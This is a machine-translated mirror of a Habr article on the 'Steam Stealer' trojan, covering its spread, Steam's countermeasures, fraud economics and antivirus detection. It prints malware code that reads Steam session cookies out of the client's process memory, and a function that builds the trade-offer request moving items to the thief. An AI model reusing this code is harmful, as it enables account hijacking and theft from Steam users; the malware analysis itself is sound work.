<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Steam Stealer or Trojan stealing things on Steam. The history of the appearance and scheme of work</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Write an article prompted the publication "Troyan, stealing items from the inventory of Steam . " 
 My article contains: 
 1) The history of the appea...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Steam Stealer or Trojan stealing things on Steam. The history of the appearance and scheme of work</h1><div class="post__text post__text-html js-mediator-article">  Write an article prompted the publication <a href="http://habrahabr.ru/post/246175/">"Troyan, stealing items from the inventory of Steam</a> . <a href="http://habrahabr.ru/post/246175/">"</a> <br>  My article contains: <br>  1) The history of the appearance and distribution in RuNet; <br>  2) The history of the struggle of "Stim" with this malware; <br>  3) Due to which fraudsters make a profit? <br>  4) What are the incentives doing in connection with these frauds? <br>  The article does not have full source code or links where you can get / buy it.  Who cares - welcome under cat. <br><a name="habracut"></a><br><h4>  <b>The history of the appearance and distribution in Runet</b> </h4><br>  Who was the original author of this trojan is unknown, the first mentions appeared in America at the beginning of this year.  In the runet, this trojan appeared and began to spread actively only in mid-late summer. <br><br>  The program and the source code appeared in early August on a popular "cheat" portal.  Two friends found the assembled and covered Trojan, noticed that it was written in C # and managed to pull out a rather confusing, but working source code.  Next, the builder was compiled and posted on the portal, after some time it was laid out and rewritten into a human form and source.  From this moment on, mention of him could be found everywhere.  Only on a very lazy and inactive forum it was impossible to find, if not a copy of the working source, then the person selling the finished ‚Äúbuild‚Äù. <br><br><h4>  General scheme of work: </h4><br>  From the Steam process, two SteamLogin and SteamLoginSecure cookies are torn out regularly: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre><code class="cs hljs">WinApis.SYSTEM_INFO sYSTEM_INFO = <span class="hljs-keyword"><span class="hljs-keyword">default</span></span>(WinApis.SYSTEM_INFO); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (sYSTEM_INFO.minimumApplicationAddress.ToInt32() == <span class="hljs-number"><span class="hljs-number">0</span></span>) { WinApis.GetSystemInfo(<span class="hljs-keyword"><span class="hljs-keyword">out</span></span> sYSTEM_INFO); } IntPtr minimumApplicationAddress = sYSTEM_INFO.minimumApplicationAddress; <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> num = (<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)minimumApplicationAddress.ToInt32(); List&lt;<span class="hljs-keyword"><span class="hljs-keyword">string</span></span>&gt; list = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> List&lt;<span class="hljs-keyword"><span class="hljs-keyword">string</span></span>&gt;(); Process[] array = array = Process.GetProcessesByName(<span class="hljs-string"><span class="hljs-string">"steam"</span></span>); Process process = <span class="hljs-literal"><span class="hljs-literal">null</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; array.Length; i++) { <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> (ProcessModule processModule <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> array[i].Modules) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (processModule.FileName.EndsWith(<span class="hljs-string"><span class="hljs-string">"steamclient.dll"</span></span>)) { process = array[i]; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> { } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (process != <span class="hljs-literal"><span class="hljs-literal">null</span></span>) { IntPtr handle = WinApis.OpenProcess(<span class="hljs-number"><span class="hljs-number">1040u</span></span>, <span class="hljs-literal"><span class="hljs-literal">false</span></span>, process.Id); WinApis.PROCESS_QUERY_INFORMATION pROCESS_QUERY_INFORMATION = <span class="hljs-keyword"><span class="hljs-keyword">default</span></span>(WinApis.PROCESS_QUERY_INFORMATION); IntPtr intPtr = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> IntPtr(<span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (WinApis.VirtualQueryEx(handle, minimumApplicationAddress, <span class="hljs-keyword"><span class="hljs-keyword">out</span></span> pROCESS_QUERY_INFORMATION, <span class="hljs-number"><span class="hljs-number">28u</span></span>) != <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (pROCESS_QUERY_INFORMATION.Protect == <span class="hljs-number"><span class="hljs-number">4u</span></span> &amp;&amp; pROCESS_QUERY_INFORMATION.State == <span class="hljs-number"><span class="hljs-number">4096u</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[] array2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[pROCESS_QUERY_INFORMATION.RegionSize]; WinApis.ReadProcessMemory(handle, pROCESS_QUERY_INFORMATION.BaseAdress, array2, pROCESS_QUERY_INFORMATION.RegionSize, <span class="hljs-keyword"><span class="hljs-keyword">out</span></span> intPtr); <span class="hljs-keyword"><span class="hljs-keyword">string</span></span> @<span class="hljs-keyword"><span class="hljs-keyword">string</span></span> = Encoding.UTF8.GetString(array2); MatchCollection matchCollection = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Regex(<span class="hljs-string"><span class="hljs-string">"7656119[0-9]{10}%7c%7c[A-F0-9]{40}"</span></span>, RegexOptions.IgnoreCase).Matches(@<span class="hljs-keyword"><span class="hljs-keyword">string</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (matchCollection.Count &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> (Match match <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> matchCollection) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!list.Contains(match.Value)) { list.Add(match.Value); } } } } num += (<span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)((<span class="hljs-keyword"><span class="hljs-keyword">ulong</span></span>)pROCESS_QUERY_INFORMATION.RegionSize); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (num &gt;= <span class="hljs-number"><span class="hljs-number">2147483647L</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } minimumApplicationAddress = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> IntPtr(num); } <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.ParsedSteamCookies = list; } }</code> </pre> <br>  Further, the data is substituted into the web request, which is sent to the server and the session is obtained, well, authorization.  After that, the program theoretically has full access to all functions of the Steam client.  Getting a list of items and sending a trade offer was described in a <a href="http://habrahabr.ru/post/246175/">previous article</a> (the code given in that article for sending an offer is not working). <br><br><h4>  <b>The history of the struggle of the stim with this malware</b> </h4><br>  Since August, Steam has already made two attempts to combat this trojan.  Although the second is hardly a real struggle, rather it was a side effect of some kind of update. <br><br><h5>  Fix the first.  Beginning of September </h5><br>  As I mentioned above, 2 cookies are parsed from the client, but one of them (SteamLoginSecure) was enough to send an offer (an offer to exchange things with an attacker).  Fix from Steam was that now needed both.  As you understand, the ‚Äúproblem‚Äù in the work of the steeler was found by the same craftsmen in less than a day.  Well, after another couple of days, the new actor (not me) already posted the revised source code for general access (however, he is now scolding his own deed). <br><br><h5>  Fix the second.  November 17 </h5><br>  Honestly, it's not known why, but Steam decided to add 1 parameter to the request for sending an offer: <br><br><pre> <code class="cs hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">string</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sentItems</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span></span></span></span><span class="hljs-function"><span class="hljs-params"> sessionID, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span></span></span></span><span class="hljs-function"><span class="hljs-params"> items, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span></span></span></span><span class="hljs-function"><span class="hljs-params">[] Offer, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span></span></span></span><span class="hljs-function"><span class="hljs-params"> message = </span></span><span class="hljs-string"><span class="hljs-function"><span class="hljs-params"><span class="hljs-string">""</span></span></span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> SteamHttp.SteamWebRequest(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.cookiesContainer, <span class="hljs-string"><span class="hljs-string">"tradeoffer/new/send"</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">string</span></span>.Concat(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">string</span></span>[] { <span class="hljs-string"><span class="hljs-string">"sessionid="</span></span>, sessionID, <span class="hljs-string"><span class="hljs-string">"&amp;partner="</span></span>, Offer[<span class="hljs-number"><span class="hljs-number">0</span></span>], <span class="hljs-string"><span class="hljs-string">"&amp;serverid=1"</span></span>, <span class="hljs-string"><span class="hljs-string">"&amp;tradeoffermessage="</span></span>, Uri.EscapeDataString(message), <span class="hljs-string"><span class="hljs-string">"&amp;json_tradeoffer="</span></span>, Uri.EscapeDataString(<span class="hljs-keyword"><span class="hljs-keyword">string</span></span>.Format(<span class="hljs-string"><span class="hljs-string">"{5}\"newversion\":true,\"version\":2,\"me\":{5}\"assets\":[{3}],\"currency\":[],\"ready\":false{6},\"them\":{5}\"assets\":[],\"currency\":[],\"ready\":false{6}{6}"</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">object</span></span>[] { sessionID, Offer[<span class="hljs-number"><span class="hljs-number">0</span></span>], message, items, Offer[<span class="hljs-number"><span class="hljs-number">2</span></span>], <span class="hljs-string"><span class="hljs-string">"{"</span></span>, <span class="hljs-string"><span class="hljs-string">"}"</span></span> })), <span class="hljs-string"><span class="hljs-string">"&amp;trade_offer_create_params="</span></span>, Uri.EscapeDataString(<span class="hljs-keyword"><span class="hljs-keyword">string</span></span>.Format(<span class="hljs-string"><span class="hljs-string">"{0}\"trade_offer_access_token\":\"{2}\"{1}"</span></span>, <span class="hljs-string"><span class="hljs-string">"{"</span></span>, <span class="hljs-string"><span class="hljs-string">"}"</span></span>, Offer[<span class="hljs-number"><span class="hljs-number">2</span></span>])) }), <span class="hljs-string"><span class="hljs-string">"tradeoffer/new/?partner="</span></span> + Offer[<span class="hljs-number"><span class="hljs-number">1</span></span>] + <span class="hljs-string"><span class="hljs-string">"&amp;token="</span></span> + Offer[<span class="hljs-number"><span class="hljs-number">2</span></span>]); }</code> </pre><br>  Specifically, the "serverid = 1" parameter.  Why it is needed and why it was added it is necessary to ask the developers of "Steam", but I could not find other requests where it could have been used. <br><br>  Although explaining the "lazy" fixes from the stim is quite simple. <br><br><h4>  Due to what are fraudsters ( <b>and Steam!</b> ) Make a profit? </h4><br>  All game values ‚Äã‚Äãthat scammers get are sold at a reduced price on the trading floor.  Here I want to remind you that Steam gets 5% from all operations on the trading platform.  And 10% gets the developer of the game, the item which was sold.  Considering that the developer of the most popular games with items and the Steam service is Valve, it is quite logical that they will not be in a hurry with the fix, getting another 15% from each sold item. <br><br>  Further, fraudsters in different ways are already withdrawing money from Steam.  Since it cannot be done directly, they use the value of the Steam service itself to sell.  For example, keys or games (as far as I know, they get about 50-65 cents per dollar). <br><br><h4>  <b>What are they doing on Steam in connection with these scams?</b> </h4><br>  It takes up to 7 days to lock an account (or rather, to block buying / selling / exchanging), which is thrown off things.  During this time, attackers often have time to get rid of the items received and withdraw funds from your account.  If an account is blocked, nothing can be withdrawn from it.  Maximum - play those games that are on it. <br>  I must say that in the "Steam" is the practice of returning stolen items, if they were not sold on the trading floor.  But, let's say, with the Russian support it took a month: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e43/31d/024/e4331d024e05b2b3b10a4d8c9c7292e0.png" alt="image"><br><br><h4>  <b>Epilogue</b> </h4><br>  He did not distribute himself.  All information is taken from people who develop or distribute.  The prices for this software are quite liberal: 500-1000 rubles for the program into which the account is sewn.  The source is from 3.5k rubles and above - depending on whether this source is bought from the developer or from the student who bought it and now resells it.  At the moment, I know about about 4 different developers.  However, among themselves their products are virtually the same. <br><br>  And finally.  The best antiviruses at the moment by definition of such programs are Avira, Kaspersky, Eset Nod32.  They define fresh and fairly decently obfuscated / covered versions of the Trojan, however, not always.  The rest react for quite some time.  Even the simple obfuscation of .Net applications is confused by most antiviruses. </div><p>Source: <a href="https://habr.com/ru/post/246279/">https://habr.com/ru/post/246279/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../246265/index.html">C # for AS3 developers. Part 2: Extending Classes and Implementing Interfaces</a></li>
<li><a href="../246269/index.html">Promotional codes for the free Microsoft 70-695, 70-696 exams</a></li>
<li><a href="../246273/index.html">WordPress updated to version 4.1</a></li>
<li><a href="../246275/index.html">The best instant messenger for team work: Compare HipChat, Slack and Kato</a></li>
<li><a href="../246277/index.html">Assembling and installing Calamari monitoring system packages for CEPH 0.87 distributed storage on Ubuntu 04/14/1 (Trusty Tahr)</a></li>
<li><a href="../246281/index.html">Talk about VPNs? Types of VPN connections. VPN scaling</a></li>
<li><a href="../246283/index.html">Maintaining a "third-party" information resource. How and for what</a></li>
<li><a href="../246285/index.html">Testing GWT MVP Architecture Applications</a></li>
<li><a href="../246287/index.html">The last day of your discount is 89% on the annual program of Stratoplan</a></li>
<li><a href="../246289/index.html">Improving mobile project management</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>